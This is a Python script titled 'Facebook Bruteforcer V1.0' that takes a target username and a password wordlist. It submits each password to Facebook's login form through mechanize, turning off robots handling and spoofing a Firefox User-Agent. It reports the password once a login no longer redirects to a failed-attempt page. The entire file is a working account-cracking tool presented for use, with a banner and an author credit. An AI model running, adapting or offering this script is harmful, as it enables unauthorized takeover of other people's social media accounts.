import mechanize
import sys
import os, time

RED="\033[01;31m"
YELLOW="\033[01;33m"
BLUE="\033[01;34m"
BOLD="\033[01;01m"
RST="\033[00m"

if os.name == 'nt':
    RED = YELLOW = YELLOW = BLUE = BOLD = RST = ''

banner = """
    ▄▄▄▄· ▄▄▄  ▄• ▄▌▄▄▄▄▄▄▄▄ .·▄▄▄ face ▄▄▄   ▄▄· ▄▄▄ .▄▄▄  
    ▐█ ▀█▪▀▄ █·█▪██▌•██  ▀▄.▀·▐▄▄·▪ book▀▄ █·▐█ ▌▪▀▄.▀·▀▄ █·
    ▐█▀▀█▄▐▀▀▄ █▌▐█▌ ▐█.▪▐▀▀▪▄██▪  ▄█▀▄ ▐▀▀▄ ██ ▄▄▐▀▀▪▄▐▀▀▄ 
    ██▄▪▐█▐█•█▌▐█▄█▌ ▐█▌·▐█▄▄▌██▌.▐█▌.▐▌▐█•█▌▐███▌▐█▄▄▌▐█•█▌
    ·▀▀▀▀ .▀  ▀ ▀▀▀  ▀▀▀  ▀▀▀ ▀▀▀  ▀█▄▀▪.▀  ▀·▀▀▀  ▀▀▀ .▀  ▀
            FACEBOOK BRUTEFORCER VERSION 1.0
"""

info = '''
    +===============================================+
    |           Facebook Bruteforcer V1.0           |
    +===============================================+
    |                                               |
            ☠ WRITTEN BY SHUBHAM VISHWAKARMA
            ☠ GIT     : /SHUBHAMVIS98               
    |                                               |
    +===============================================+
'''

print(RED + banner + BLUE + info + RST)

def main():
    user = input(BLUE + '[?] Enter Username: ' + RST)
    passfile = input(BLUE + '[?] Password File Path: ' + RST)
    print()
    pwd = open(passfile, 'r')

    for passwd in pwd:
        print(YELLOW + 'Trying: ' + RST + str(passwd.strip()))
        br = mechanize.Browser()
        br.set_handle_robots(False)
        br.addheaders = [('User-Agent', 'Mozilla/5.0 (Windows 10; rv:41.0) Gecko/41.0 Firefox/41.0')]
        br.open('https://www.facebook.com/login.php')
        br.select_form(nr=0)
        br.form['email'] = user
        br.form['pass'] = passwd
        sub = br.submit()
        reslink = sub.geturl()

        if 'login_attempt' in reslink:
            print(RED + '          `--> Incorrect\n' + RST)
        else:
            print(YELLOW + 'Password found: '+ str(passwd.strip()) + RST)
            print(RED + 'Response Link: {}'.format(reslink) + RST)
            sys.exit()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(RED + '\n\nExitting...' + RST)
        time.sleep(1)